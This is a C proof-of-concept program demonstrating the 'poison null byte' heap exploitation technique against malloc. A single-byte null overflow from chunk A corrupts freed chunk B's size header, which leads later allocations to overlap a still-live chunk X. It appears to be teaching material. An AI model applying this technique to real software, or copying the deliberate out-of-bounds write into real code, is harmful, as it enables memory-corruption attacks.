#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define WORD_SIZE ((size_t)-1 > 0xffffffffUL ? 8 : 4)

int get_chunk_size(void *chunk){
 return (*(int*)(chunk - WORD_SIZE) & ~0x03) - WORD_SIZE; // ~0x03 gets rid of the last |M|A|P| bits used in the size header
}

int get_chunk_prev_size(void *chunk){
 return (*(int*)(chunk - WORD_SIZE*2) & ~0x03) - WORD_SIZE;
}


int main(){
 char *A, *B, *C, *X;
 void *top;
 printf("[+] Allocating A, B, C\n");
 A = malloc(0x100-WORD_SIZE);
 B = malloc(0x250-WORD_SIZE);
 C = malloc(0x100-WORD_SIZE);
 printf("[+] Heap is now:\n| A | B | C |\n");
 printf("A is at %p\nB is at %p\nC is at %p\n\n", A, B, C);
 printf("[+] Size of B is %d\n\n", get_chunk_size(B));
 // OOB null byte write
 printf("[+] Single null-byte overflow happening from A into free()'d B space\n");
 free(B);
 A[0x100-WORD_SIZE] = '\0'; // One byte null byte overflow into B
 printf("[+] Because of a single null byte overwrite the size of B is changed but not the PREV_SIZE of C\n");
 printf("[+]\t Size of B is now %d and PREV_SIZE of C is %d <-- OOPSx1\n", get_chunk_size(B), get_chunk_prev_size(C));
 // Since B's size shrunk, malloc() will get B's bogus size to allocate in between A and C
 printf("[+] Allocating B and X\n");
 B = malloc(0x100-WORD_SIZE);
 X = malloc(0x100-WORD_SIZE);
 printf("[+] Heap is now:\n| A | B | X | C |\n");
 printf("A is at %p\nB is at %p\nX is at %p\nC is at %p\n", A, B, X, C);
 // When using free(), B will be free()'d as usual but because of PREV_SIZE of C being old B's size
 // the implementation still thinks that B and C are coalescing and so, because of B being free,
 // it will go ahead and merge B and C into a free chunk, effectively overlapping X which was between
 // B and C and marking it as free space which is not the case. Any further uses of D are dangerous
 // in a real world scenario (use-after-invalidation type of vulnerabilities)
 printf("\n[+] free()'ing B and C which will cause them to be merged into a big chunk at B (%p)\n", B);
 free(B);
 free(C);
 printf("[+] X at %p was forgotten by the implementation! OOPSx2\n", X);

 printf("[+] Allocating B with the size of B(0x250) + C(0x100)\n");
 B = malloc(0x250-WORD_SIZE+0x100-WORD_SIZE); // BOOM!
 printf("A is at %p ends at %p\nB is at %p ends at %p\nX is at %p ends at %p\n", 
  A, A+get_chunk_size(A),
  B, B+get_chunk_size(B),
  X, X+get_chunk_size(X)
 );
 
 printf("\n[+] Setting B contents to 'B's and printing contents of forgotten X which is overlapped by B\n");
 memset(B, 'B', 0x250-WORD_SIZE+0x100-WORD_SIZE);
 B[0x250+0x100-WORD_SIZE*2-1] = 0; // Null-byte end
 printf("B contents = %s\n", B);
 printf("X contents = %s\n", X);
 
 return 0;
}


